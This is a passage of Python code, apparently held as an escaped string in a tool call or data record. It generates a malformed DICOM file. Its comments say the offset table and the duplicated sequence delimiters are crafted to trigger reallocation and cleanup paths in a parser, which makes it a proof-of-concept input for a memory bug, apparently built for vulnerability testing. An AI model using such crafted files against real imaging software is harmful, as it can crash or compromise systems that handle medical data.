ct.pack(\'<H\', 1))\n    \n    # Photometric Interpretation\n    write_dicom_tag(f, 0x0028, 0x0004, \'CS\', b\'MONOCHROME2 \')\n    \n    # Pixel Data tag (7FE0,0010) with encapsulated format\n    # This triggers the offset table parsing code path\n    f.write(struct.pack(\'<HH\', 0x7FE0, 0x0010))  # Pixel Data tag\n    f.write(b\'OB\')  # VR for pixel data\n    f.write(struct.pack(\'<H\', 0))  # Reserved\n    f.write(struct.pack(\'<I\', 0xFFFFFFFF))  # Undefined length\n    \n    # Item tag for offset table (FFFE,E000)\n    f.write(struct.pack(\'<HH\', 0xFFFE, 0xE000))\n    # Create a malformed offset table that will cause issues\n    offset_table_length = 64  # Multiple offsets\n    f.write(struct.pack(\'<I\', offset_table_length))\n    \n    # Write offset table with crafted values that will trigger reallocation\n    for i in range(offset_table_length // 4):\n        f.write(struct.pack(\'<i\', i * 100))\n    \n    # Add another fragment item to trigger multiple allocations\n    f.write(struct.pack(\'<HH\', 0xFFFE, 0xE000))\n    fragment_length = 128\n    f.write(struct.pack(\'<I\', fragment_length))\n    f.write(b\'\\x00\' * fragment_length)\n    \n    # Add sequence delimiter to cause early exit and trigger cleanup\n    f.write(struct.pack(\'<HH\', 0xFFFE, 0xE0DD))\n    f.write(struct.pack(\'<I\', 0))\n    \n    # Sequence Delimiter (FFFE,E0DD) - triggers cleanup path\n    f.write(struct.pack(\'<HH\', 0xFFFE, 0xE0DD))\n    f.write(struct.pack(\'<I\', 0))\n\nprint(f"Generated DICOM testcase at {output_path}")\nprint(f"File size: {open(output_path, \'rb\').seek(0, 2)} bytes")\n'}
